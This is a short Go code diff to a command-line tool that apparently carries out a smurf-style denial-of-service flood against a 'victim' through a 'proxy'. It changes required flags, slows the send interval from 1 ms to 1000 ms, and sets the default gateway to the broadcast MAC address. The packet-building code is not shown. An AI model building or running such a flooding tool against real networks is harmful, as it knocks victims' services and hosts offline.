@@ -14,7 +14,7 @@ import (
 var version string // injected at build-time
 
 func smurfValidator(ctx *cli.Context) error {
-	return assertSet(ctx, victimFlag, proxyFlag, ifaceFlag, gatewayFlag)
+	return assertSet(ctx, victimFlag, proxyFlag)
 }
 
 func smurfHandler(ctx *cli.Context) error {
@@ -40,7 +40,7 @@ func smurfHandler(ctx *cli.Context) error {
 		return err
 	}
 
-	interval := time.Millisecond * 1
+	interval := time.Millisecond * 1000
 	fmt.Printf(banner, victim, proxy, interval.String(), hex.Dump(p.payload))
 	for {
 		if err = p.execute(); err != nil {
@@ -63,7 +63,8 @@ func main() {
 			Flags: []cli.Flag{
 				asMandatory(victimFlag),
 				asMandatory(proxyFlag),
-				withDefault(gatewayFlag, "192.168.1.254"),
+				// default is pumping frames out to broadcast MAC
+				withDefault(gatewayFlag, "FF:FF:FF:FF:FF:FF"),
 				withDefault(ifaceFlag, "en0"),
 			},
 			Before: smurfValidator,
